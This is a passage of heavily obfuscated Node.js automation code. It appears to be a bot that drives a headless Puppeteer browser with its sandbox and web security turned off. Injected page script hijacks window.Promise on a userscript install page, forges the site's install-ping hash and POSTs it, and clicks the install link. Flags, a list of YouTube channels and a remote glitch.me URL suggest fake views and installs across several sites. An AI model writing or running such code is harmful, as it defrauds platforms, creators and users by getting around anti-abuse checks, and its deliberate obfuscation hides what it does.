                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x60e + -0x18d6 + 0x32c * 0x6 ? (this['block'] = P[0xf65 * 0x1 + 0x3 * -0x641 + 0x36e * 0x1], this['start'] = N - (0x90 * -0x2d + 0x11 * 0xf1 + 0x98f), this['hash'](), this['hashed'] = 0x1818 + 0x1213 + -0x2a2a) : this['start'] = N;
                }
                return this['bytes'] > 0x1371e5c03 + 0x13bd5d903 + -0x172f43507 && (this['hBytes'] += this['bytes'] / (0x1bbaf6f18 + -0x6c951258 + -0x4f1a5cc0) << 0x46e + 0x13e7 + -0x1 * 0x1855, this['bytes'] = this['bytes'] % (-0x142671174 + -0x1af295928 + -0x7435754 * -0x8b)), this;
              }
            }
            ['finalize']() {
              const U = c;
              if (!this['finalized']) {
                this['finalized'] = -0xad + 0x47 * 0x31 + -0xce9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x4a4 + 0x466 + -0x8fa] = this['block'], J[K >> -0x22bf + -0x1d38 + -0x1553 * -0x3] |= x[0x23f5 + -0x1ee3 + -0x50f & K], this[U(0x1a)] = J[0x1f49 + -0x1b * -0xc1 + -0x1 * 0x3394], K >= -0x260 * 0x2 + 0xaaa + -0x5b2 && (this['hashed'] || this['hash'](), J[-0x535 + 0x401 + 0xb * 0x1c] = this['block'], J[-0xf38 * 0x1 + -0x229f * -0x1 + 0x1357 * -0x1] = J[-0x26fd + -0x42d * -0x2 + -0xf52 * -0x2] = J[0x1ad2 + 0x6de * 0x5 + -0x3d26] = J[-0x12ab + 0x1b19 + -0x86b] = J[0x246 + -0x1bb7 + 0x7 * 0x3a3] = J[0xbcf * 0x1 + 0x97 * -0x7 + -0x7a9] = J[0x15cf * -0x1 + 0x1e58 + -0x883] = J[0xdd3 + -0x4ce + -0x1 * 0x8fe] = J[-0xea7 + -0x4 * -0x88c + -0x1381] = J[-0x1233 + 0x2b * -0x34 + 0x1 * 0x1af8] = J[-0x21cd + -0x1 * 0xb67 + 0x2 * 0x169f] = J[-0x22bd * 0x1 + -0x1 * 0x2510 + 0x47d8] = J[0x1 * -0x1349 + 0x79 * -0x1b + 0x278 * 0xd] = J[-0x1 * -0xdcf + 0x3 * 0x79a + -0x2490] = J[-0x1ae3 + 0x1db4 + -0x2c3] = J[-0x6 * -0x44f + 0x12da + 0x1 * -0x2ca5] = 0x25b3 + -0xc * -0x8f + 0xecd * -0x3), J[-0x179f + -0x13a9 * 0x1 + 0x2b56 * 0x1] = this['hBytes'] << 0x6d * 0x12 + -0x2 * -0x129e + -0x2ce3 | this['bytes'] >>> -0x7 * 0x53f + 0x1665 + -0xe71 * -0x1, J[0x1c21 + 0x1f1e + -0x3b30 * 0x1] = this['bytes'] << 0xb07 + -0x145c * 0x1 + 0x958, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2330 + 0x4ee + 0x1e52; J < -0x89b * -0x1 + -0x534 + 0x1 * -0x317; ++J)
                K = Q[J - (0x97 * 0x1f + -0x9 * 0x11b + -0x853)] ^ Q[J - (-0xe5 * -0x21 + 0x183a + -0x35b7)] ^ Q[J - (0x220c * 0x1 + -0x5e * -0x2b + -0x31c8)] ^ Q[J - (-0x1 * -0x1908 + -0x1c71 + 0x379)], Q[J] = K << 0x53d + -0x142 + -0x3fa | K >>> 0x236f * 0x1 + 0x14e3 + 0x3833 * -0x1;
              for (J = -0x6 * 0x30 + 0x19b * 0x5 + -0x39 * 0x1f; J < -0x2296 * -0x1 + 0x8 * -0x7f + -0x1e8a; J += -0x1 * 0x166d + 0x7 * 0x545 + 0xe71 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x241d + -0x1672 + -0x17 * -0x28c | L >>> -0x21 * 0x2 + 0x47b * 0x2 + -0x899) + (M & N | ~M & O) + P + (-0xb09 * 0x5ac83 + -0x5a8e67b + 0x9ec811af) + Q[J] << -0x1 * 0x9f2 + 0x4 * 0x8db + -0x197a) << -0x1 * 0xf6 + 0xbfe + -0xb03 * 0x1 | P >>> -0x361 * 0x5 + 0x2322 + -0x1222) + (L & (M = M << -0x25b9 + 0x15e7 + 0xff0 | M >>> 0x1b5e + 0x36d * -0x1 + -0x1 * 0x17ef) | ~L & N) + O + (-0xd * -0xa7213ea + 0x622 * -0x1857ca + -0x6801db8b * -0x1) + Q[J + (-0x1943 + 0x1 * 0x15d8 + -0x1 * -0x36c)] << -0xad8 + -0x1 * -0x478 + 0x660) << -0x2363 * 0x1 + 0x270d + 0x3a5 * -0x1 | O >>> 0x22f4 + -0x255e + 0x81 * 0x5) + (P & (L = L << 0x2476 + 0x215 + 0xccf * -0x3 | L >>> 0x169 + 0xd36 + 0x4df * -0x3) | ~P & M) + N + (0x2d54fcd8 + 0x4f6e8ba2 + -0x22410ee1 * 0x1) + Q[J + (-0x7 * 0x436 + -0x8 * -0x445 + -0x4ac)] << 0xc0 * -0x21 + -0x2 * 0x128d + 0x3dda) << -0x9c3 + 0x6c8 + 0x30 * 0x10 | N >>> 0x4 * -0x8e9 + 0x94a * 0x3 + -0x7e1 * -0x1) + (O & (P = P << -0x1a43 + -0x1c78 + 0x1 * 0x36d9 | P >>> -0x20 * -0x19 + -0x34 * 0x23 + 0x3fe) | ~O & L) + M + (0x3758f6f3 * 0x1 + -0x298e716 * -0x5 + 0x162cff38) + Q[J + (0x177b * -0x1 + -0x3 * 0x647 + 0x877 * 0x5)] << -0x186d + 0x3 * 0xce3 + -0x71e * 0x2) << 0x3e5 * -0x3 + 0xa5 + 0xb0f | M >>> -0x4db * -0x3 + 0x369 + -0x11df * 0x1) + (N & (O = O << -0x49f + -0x49 * -0x53 + -0x12ee | O >>> 0x2b * -0x71 + 0x793 * -0x4 + 0x3149) | ~N & P) + L + (0x8b75ae8f + 0x9 * -0xb5cc963 + 0x354fdf85) + Q[J + (0x1d01 + 0x2362 + -0x405f)] << 0x1a66 + -0x89 * 0x3c + 0x5b6, N = N << 0x3 * 0x836 + -0xec4 + -0x9c0 | N >>> 0x1964 + -0x1 * 0x892 + -0x10d0;
              for (; J < 0x8 * -0x4b0 + -0x1d0f * -0x1 + 0x1 * 0x899; J += -0x1378 + -0x19d6 * -0x1 + -0x659 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3 * 0xbdd + -0x176 * -0xb + 0x2 * -0x19d2 | L >>> 0x1cd2 + -0x13bf + -0x8f8) + (M ^ N ^ O) + P + (0x47ec6652 + 0x1f40185 + -0x1 * -0x24f983ca) + Q[J] << -0x1 * 0xeb9 + -0x9a9 * 0x1 + -0x1862 * -0x1) << 0x91e + -0xd6f * -0x1 + -0x1688 | P >>> 0xd6f + -0x57d + 0x3 * -0x29d) + (L ^ (M = M << 0xd57 + 0x19 * 0x7d + -0x3e * 0x69 | M >>> 0xc83 + -0x234a * 0x1 + 0x1 * 0x16c9) ^ N) + O + (0xa1 * -0x14bd176 + -0x29261c6e + -0x783a4117 * -0x3) + Q[J + (-0x15 * 0xb7 + 0x4d * 0x22 + 0x4ca)] << 0x1 * 0x360 + 0x6f4 + -0xa54) << -0x1688 + 0x115 * -0x9 + 0x2 * 0x1025 | O >>> 0x1592 + 0x1 * 0x1564 + -0xe49 * 0x3) + (P ^ (L = L << 0x3 * -0x53 + 0x5 * 0x4a2 + -0x1613 | L >>> -0x15b9 + -0x13a9 * -0x1 + 0x109 * 0x2) ^ M) + N + (-0xd998a955 + -0x27d6cad6 + 0x884 * 0x2b3f93) + Q[J + (0x140f + -0x1bd + -0x1250)] << 0xcc1 * -0x1 + -0xa1b + 0x16dc) << -0x9b7 * 0x4 + -0x7f * 0x1 + 0x15 * 0x1e0 | N >>> -0x12f9 * -0x1 + 0x24be + -0x379c) + (O ^ (P = P << -0x21d4 + 0x63a + 0x1bb8 | P >>> -0x1 * -0x1f9f + 0x22f3 + -0x4290) ^ L) + M + (0x194 * 0x4323ef + -0x69c11c5c + 0x6ea652d1) + Q[J + (0x1411 + 0x95 * 0x2f + -0x2f69)] << 0x162a + 0xb * 0xbe + -0xa1c * 0x3) << -0x7 * -0x3f1 + 0x7 * 0x20e + -0x29f4 | M >>> -0x1e27 + 0x4db + 0x1967) + (N ^ (O = O << 0x1 * 0x11b5 + -0x58a * 0x2 + -0x683 | O >>> 0x26d3 + -0x4df + -0x21f2) ^ P) + L + (-0x45d6d * 0x2228 + 0x10e3776a + 0xf30d873f) + Q[J + (0xd + 0xc7 + 0x2 * -0x68)] << -0x22e3 + -0x77d + 0x2a60, N = N << 0x2b7 + 0xc1 * 0x29 + -0x1 * 0x2182 | N >>> -0x2 * -0x10cf + 0x3 * 0xc65 + -0x1 * 0x46cb;
              for (; J < -0xd * -0x166 + -0x1d95 + 0xba3; J += 0x4 * -0x646 + 0x7c2 * -0x5 + 0x13 * 0x35d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x199a + -0x119f + -0x7f6 | L >>> 0x229f * -0x1 + -0x2b * 0xa7 + 0x3ec7) + (M & N | M & O | N & O) + P - (-0x21d1 * -0x3fc8e + -0x8036f09c + 0x6a4bb5d2) + Q[J] << 0xc2c + 0x21fd + 0x12f * -0x27) << 0x1ad6 + 0xa73 + -0x951 * 0x4 | P >>> -0x256a + 0x205 * 0xd + 0x5a2 * 0x2) + (L & (M = M << 0xb * 0x1fd + 0x1681 + -0x2c42 | M >>> -0x530 + 0x56 * 0x5c + 0x1 * -0x19b6) | L & N | M & N) + O - (-0xa77b4170 + 0x2 * -0xa236f8f + -0x2 * -0x965331d9) + Q[J + (0x1d * -0xea + -0x2 * 0x417 + 0x22b1)] << 0x264e + 0xf8 + -0xb * 0x392) << -0x201a * -0x1 + 0x24e1 + -0x5b * 0xc2 | O >>> 0x1e34 + 0x1c3 * 0x12 + -0x3dcf) + (P & (L = L << 0x3a9 * -0xa + 0xaf1 + 0x1 * 0x19c7 | L >>> 0x1c7d + 0x25be + 0x4239 * -0x1) | P & M | L & M) + N - (-0x15ad9fc1 + -0xc192b * -0xe8f + -0x29908620) + Q[J + (-0x341 * -0x1 + 0x1dd3 + 0x53 * -0x66)] << -0x221f + 0x4af * -0x3 + 0x302c * 0x1) << 0x2562 + 0xead * -0x1 + -0x79 * 0x30 | N >>> -0x796 + 0x1b29 + -0x59 * 0x38) + (O & (P = P << 0x222b * -0x1 + 0x475 + -0x2e * -0xa6 | P >>> 0x2f5 * 0x1 + -0xb9c * 0x3 + 0x1fe1) | O & L | P & L) + M - (-0x3fb5d01b * -0x1 + -0x79a0fb18 + 0xaacf6e21) + Q[J + (0x1ab7 + 0x2265 + -0x3d19)] << -0xed2 + 0x1363 + 0x7 * -0xa7) << 0x664 * 0x2 + -0x18dd + 0x2 * 0x60d | M >>> -0xa04 + 0x65f + -0x1e * -0x20) + (N & (O = O << 0x10 * 0x223 + 0x74d + 0x5e9 * -0x7 | O >>> 0x4 * -0x36f + 0x1e7 + 0x1b1 * 0x7) | N & P | O & P) + L - (0x826e44e5 + 0xac9d132f + -0xe * 0xd9513c8) + Q[J + (0x1b7c + 0x95 * -0x1 + -0x1ae3)] << -0x2379 + -0x183e + 0x3bb7, N = N << -0xf72 + 0x12dc + -0x34c | N >>> -0x1 * 0xd8e + -0x249 * 0xb + -0x26b3 * -0x1;
              for (; J < -0x14 * 0x4b + 0x1598 * -0x1 + -0xde2 * -0x2; J += -0x2b4 * 0x4 + 0x3 * 0x131 + 0x2 * 0x3a1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1854 + -0x18a * -0x7 + 0x2b7 * 0x5 | L >>> -0x23ea + -0x23ef + 0x47f4) + (M ^ N ^ O) + P - (0x1b3c2eeb * 0x1 + 0x2ea5ba4 * 0x19 + -0x2e81e3c5) + Q[J] << -0x2580 + 0x1f * -0x11 + 0xf7 * 0x29) << 0xc27 + 0x23c0 + -0x2fe2 | P >>> 0x154f + 0x19 * 0xbf + -0x27db) + (L ^ (M = M << -0x1 * 0x12be + 0x8db * 0x3 + 0x1 * -0x7b5 | M >>> 0x1 * 0x21bd + -0xc1 * -0xf + -0x2d0a) ^ N) + O - (0xeff * 0x3ef7a + -0x12452b30 + 0xcde32d4) + Q[J + (-0xa * 0x7 + -0x251d * -0x1 + -0x24d6)] << -0x48 * 0xb + -0x646 + 0x95e) << -0x83e * 0x3 + 0x1a8f + -0x1 * 0x1d0 | O >>> 0x359 * -0x7 + 0x2 * 0xc81 + -0x178) + (P ^ (L = L << 0x1 * -0x1093 + -0x7 * -0xf4 + 0x3 * 0x357 | L >>> 0x11b3 * 0x1 + 0x1d6 * 0x6 + -0x1cb5 * 0x1) ^ M) + N - (0x5148c343 + -0x64b24d87 + 0x4906c86e) + Q[J + (0xc39 + -0xa * 0x26 + 0x1 * -0xabb)] << -0x2 * -0xf8 + 0xc46 * -0x1 + 0xa56) << -0x1111 + -0x3 * -0x3bc + 0x5e2 | N >>> -0x507 * 0x5 + -0xea7 + 0x27e5) + (O ^ (P = P << 0x863 + 0x3a1 * 0x2 + -0x1 * 0xf87 | P >>> -0xf1 * -0x1 + -0x11f2 + 0x14f * 0xd) ^ L) + M - (-0x60b584ee + 0x4ab590b0 + 0x4b9d3268) + Q[J + (-0x620 + -0x23c7 + 0x29ea)] << -0x12f5 + 0x214 + 0x10e1) << 0x4d6 * 0x1 + 0x98 * 0x3d + -0x2909 | M >>> 0x14a + -0x21f2 + 0x20c3 * 0x1) + (N ^ (O = O << -0x49 * -0x21 + -0x1cf3 + 0x22 * 0x94 | O >>> -0x99b + 0xc59 * -0x1 + -0x3a9 * -0x6) ^ P) + L - (-0x5e55 * -0x1604 + 0x5b6de226 + 0x54e42 * -0x8a8) + Q[J + (0xac4 + 0x1006 + -0x2 * 0xd63)] << -0x6df * 0x3 + -0x9 * 0x1 + 0x6e2 * 0x3, N = N << -0x8 * 0x2db + -0x32f + -0x1 * -0x1a25 | N >>> -0x1 * 0xc9 + 0x2 * 0x2e5 + -0x4ff;
              this['h0'] = this['h0'] + L << 0x1 * 0x355 + 0xa1f * 0x2 + 0x1 * -0x1793, this['h1'] = this['h1'] + M << -0x1 * -0xc4b + 0x254a + -0x3195, this['h2'] = this['h2'] + N << -0x2066 + -0x2125 + 0x418b, this['h3'] = this['h3'] + O << 0xe2 * -0x1f + -0x1f * 0x124 + -0x3e * -0x103, this['h4'] = this['h4'] + P << 0xb93 + -0xe05 + 0x139 * 0x2;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x22a5 + -0x269e + -0x495f * -0x1 & -0xd07 * -0x2 + 0x61b * 0x3 + 0x2c5 * -0x10] + w[J >> -0x883 * -0x1 + 0xd36 + 0x31 * -0x71 & 0x2671 + 0x2ff * 0xd + -0x4d55] + w[J >> 0xd4a + -0x1393 + 0x65d * 0x1 & 0x17 * -0x49 + -0xc5 + 0x1 * 0x763] + w[J >> 0x1f54 + -0x8 * 0x2f9 + -0x2 * 0x3be & -0xe * -0x4c + 0xc9e + -0x1 * 0x10b7] + w[J >> 0x16fe + -0x166 * 0x7 + 0x34a * -0x4 & -0x158 * 0x1d + -0x17bc + -0x3ec3 * -0x1] + w[J >> 0x116 * -0x2 + 0x2295 + -0x399 * 0x9 & 0x21f * 0x6 + 0x7f9 + -0x14a4] + w[J >> 0xc * 0x115 + -0x21d + 0x7 * -0x18d & -0x9ef + -0x1a50 + 0x244e] + w[-0xa48 + -0x11a5 + 0x1bfc & J] + w[K >> 0x1066 + 0x1 * -0x2f9 + 0x1 * -0xd51 & 0xce6 + 0xf34 + -0x1c0b] + w[K >> -0x2688 + -0x3de + 0x25 * 0x126 & 0x745 * -0x5 + 0x7c4 + 0x8d * 0x34] + w[K >> -0xeb * 0x11 + -0x13b9 + 0x2368 & 0x1cc * 0x3 + 0x115f + -0x1 * 0x16b4] + w[K >> 0x183b * -0x1 + -0xa69 + 0x22b4 & -0x1be7 + -0x118d + 0x2d83] + w[K >> 0x1 * 0x2399 + -0x1 * -0x993 + -0x2d20 & 0x13a3 + 0x6 * 0x623 + -0x3866] + w[K >> -0x36a + 0xd23 + -0x9b1 & -0xb61 * 0x3 + 0x1265 * -0x1 + 0x3497] + w[K >> 0x5 * -0x2b9 + -0x1b9 * 0x10 + 0x11d * 0x25 & 0x3 * -0xbce + -0x121 * -0x20 + -0xa7] + w[-0x55 * 0x1f + 0x16ca + -0x638 * 0x2 & K] + w[L >> 0x142d * 0x1 + 0x2364 + -0x3775 * 0x1 & -0x193a * -0x1 + 0x2093 * -0x1 + 0x768] + w[L >> -0x2517 + -0x1 * 0xb3 + 0x25e2 & 0x83f * -0x4 + -0x43 * -0x8 + 0xa51 * 0x3] + w[L >> -0x449 * 0x2 + 0x9 * 0x2ef + -0x11c1 & -0x204a + -0x1340 + -0x3 * -0x1133] + w[L >> -0x8e1 + -0x548 + 0xe39 & 0x1 * -0x33d + 0x1 * -0x224b + -0x1 * -0x2597] + w[L >> 0x16a4 + 0x2 * -0x24f + -0x11fa & 0x11bc + 0x2435 + 0x72 * -0x79] + w[L >> -0x2464 + 0x11c8 + -0x952 * -0x2 & -0x28 * -0x80 + 0x2356 * -0x1 + 0x1 * 0xf65] + w[L >> -0x35b + -0x21ea + 0x2549 & 0x16d8 + -0x6 * 0x1e5 + -0xb6b] + w[0x3 * 0x45d + -0x8b9 + -0x44f * 0x1 & L] + w[M >> 0xb5 * -0x2d + 0xd46 + 0x12a7 & 0x80f * -0x1 + 0x1775 + -0x7 * 0x231] + w[M >> 0x5 * 0x3b8 + 0x23b2 + 0x1 * -0x3632 & 0xb37 + -0x52 + -0xad6] + w[M >> -0x11d1 * -0x1 + -0x3 * 0xba2 + 0x1129 & 0x1fbc + -0x20d3 + 0x126] + w[M >> 0x1b81 * -0x1 + -0x7d * -0xf + 0x143e & -0x4 * 0x22a + -0x5 * 0x4c4 + 0xad9 * 0x3] + w[M >> 0x2 * -0x957 + -0x229d + 0xaab * 0x5 & 0x1c7b + 0x65 * -0x1f + 0x5 * -0x33d] + w[M >> 0x2 * 0x60 + 0x20dd + -0x1 * 0x2195 & 0xe3 * 0x1e + -0xa9f + -0x3fb * 0x4] + w[M >> 0x29a * 0x6 + 0xd1f + -0x1 * 0x1cb7 & -0x8 * -0x351 + -0x2706 + 0xc8d] + w[-0x5 * -0x20a + 0x1d39 + -0x275c & M] + w[N >> 0x1fa4 + -0x5 * 0x4d4 + -0x764 & -0x1 * -0xf75 + -0x7f * 0x43 + 0x11d7] + w[N >> -0x6 * 0x32a + 0x1aa6 + -0x792 & 0xb52 + -0xa7e + -0xc5] + w[N >> -0x15e6 * -0x1 + -0x9 * -0x1d + -0x16d7 & -0xcdb + 0x1f71 + -0x1f * 0x99] + w[N >> -0x1468 + -0x1356 + -0x7f6 * -0x5 & -0x6 * -0x153 + -0x482 + 0x1 * -0x361] + w[N >> 0x685 + 0x2506 + 0x55 * -0x83 & 0x3 * -0x101 + 0x4 * 0x78b + -0x1b1a] + w[N >> -0x7 * -0x3a3 + -0x1 * -0x2b7 + -0x1c24 & -0x845 * -0x1 + -0x798 + -0x9e] + w[N >> -0x2626 + -0x152f + 0x3b59 & 0x2182 + -0x24b8 + 0x9 * 0x5d] + w[0xf55 * 0x1 + 0x1 * 0x21af + -0x30f5 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x7 * -0x4e1 + -0x98a + 0x2bc9 & -0x129f + 0x418 + 0xf86,
                J >> -0x77f * -0x3 + 0xbf * -0x22 + 0xfb * 0x3 & -0xcb7 + 0x185a + -0x2a9 * 0x4,
                J >> -0x1d * 0x133 + 0x15ff + -0x4 * -0x334 & -0x6ed * 0x4 + 0x1 * 0x15bb + 0x6f8,
                0x1d73 + 0x1 * -0x8e + -0x1 * 0x1be6 & J,
                K >> -0xb03 + -0x1 * 0xe5d + -0x65e * -0x4 & 0x1ccd + 0x964 + -0x2532,
                K >> 0xece + -0x51c + -0x9a2 & -0xb91 + -0x13 * 0x13f + 0x243d,
                K >> 0x1037 + -0x100f * 0x1 + -0x20 * 0x1 & 0x6 * 0x63e + 0x1713 + -0x3b88,
                -0x21e3 * -0x1 + -0x1 * 0xc22 + -0x14c2 & K,
                L >> 0x1d1a + -0xa * 0x121 + -0x3 * 0x5e8 & 0xdba + -0x1ee * 0xa + -0x1 * -0x691,
                L >> 0x15ef + -0x1 * -0x595 + -0x4 * 0x6dd & 0x24e6 * -0x1 + 0x1bf5 + 0x9f0,
                L >> 0x1 * 0x19b5 + -0x1738 + 0x25 * -0x11 & 0x16f6 + -0x9d6 * -0x2 + -0x13 * 0x231,
                -0x14d8 + -0x1a25 + 0x2ffc & L,
                M >> -0x1549 + 0x1764 + -0x203 & -0x1 * 0x1811 + -0xe * 0x16d + 0x2d06,
                M >> 0x1 * -0x1f46 + -0x2296 + 0x41ec & -0x877 * -0x1 + -0xfbb + -0x2c1 * -0x3,
                M >> 0x7e5 + -0x1fc3 + -0x2e * -0x85 & 0x48 + 0x3 * -0x707 + -0x2 * -0xae6,
                -0x186f + 0x2b7 * -0x5 + 0x2701 & M,
                N >> 0x2 * 0x5d2 + -0x1234 * -0x2 + -0x2ff4 & -0x1057 + 0x8eb * -0x2 + 0x232c,
                N >> 0x13e5 + 0x15cd + -0x29a2 & 0x37f * -0x1 + -0xc29 + 0x1d * 0x93,
                N >> 0x2b * -0xa + -0x2384 + 0x1 * 0x253a & -0x2063 + -0x1 * 0x1a15 + 0x3b77,
                0x2ca + 0x61 + -0x22c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x449 + -0x1f47 + 0x1b12), (K = new DataView(J))['setUint32'](-0x3 * -0x101 + 0x104b + 0x2c2 * -0x7, this['h0']), K['setUint32'](0x2251 + 0x1783 + -0x8 * 0x73a, this['h1']), K['setUint32'](0x881 + 0x9 * -0x28a + 0xe61, this['h2']), K['setUint32'](-0x1 * -0x2517 + -0x1 * 0x1286 + -0x1285, this['h3']), K['setUint32'](0x49 * 0x3a + -0x1 * -0x374 + -0x13ee, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1c3d + 0x5ae + 0x168f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2684 + -0x85 + 0x47 * -0x89;
            J[-0x1bed * 0x1 + 0x532 * -0x2 + -0x241 * -0x11]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x2513 + 0x1f1f + 0x7f * 0xc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x26f0 + 0x637 * 0x1 + -0x1 * 0x2d26), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x7 * 0x353 + -0x1150 + 0x5 * 0x81e;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x14ab * -0x1 + -0x12 * -0xf1 + -0x1 * 0x1fc1), Promise['resolve'](0xc83 + 0x5 * -0x557 + 0xe31);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x175a + 0x26a6 + -0xf4c; j < 0x1401 + 0x1d4b + 0x314b * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x2b63 + 0x13 * -0x175 + 0xf8c + (-0x1a50 + -0x2a0 * -0x1 + 0x2368) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x457 * -0x1 + -0xa5d + -0x5 * -0x135) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x29 * -0xa3 + 0x2 * 0x1147 + -0x3ca9);
    let h = e[f];
    if (c['iDNine'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x328 + -0x1 * -0x1d95 + -0x20bd, r, s, t = -0x12c1 + 0x1 * -0x1f85 + 0x3246; s = m['charAt'](t++); ~s && (r = q % (0xdf * -0x16 + 0xf04 + 0x42a) ? r * (-0x1bb * 0xf + -0x1d * 0x49 + 0xb7e * 0x3) + s : s, q++ % (0xf58 + -0x4e * 0x6 + 0x9 * -0x180)) ? o += String['fromCharCode'](-0x333 * -0xa + 0xa13 * -0x1 + 0x67 * -0x34 & r >> (-(-0x1864 + -0x2 * -0x1af + 0x1508) * q & 0x1a5 * -0x5 + 0x125b * -0x1 + 0x1a9a)) : -0x141 * -0x1b + 0x1a2e + -0x3c09) {
          s = n['indexOf'](s);
        }
        for (let u = -0x951 + 0x3 * 0x623 + -0x2 * 0x48c, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x2 * 0x584 + 0x1d6f + -0x1257))['slice'](-(-0x2210 + -0x949 + 0x2b5b));
        }
        return decodeURIComponent(p);
      };
      c['TQjNax'] = i, b = arguments, c['iDNine'] = !![];
    }
    const j = e[-0x48f * 0x2 + -0x16 * -0x9b + 0x21a * -0x2],
      k = f + j,
      l = b[k];
    return !l ? (h = c['TQjNax'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + V(0x12),
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + W(0x20),
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x25cf + -0x154e + -0x1 * -0x3b1d; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
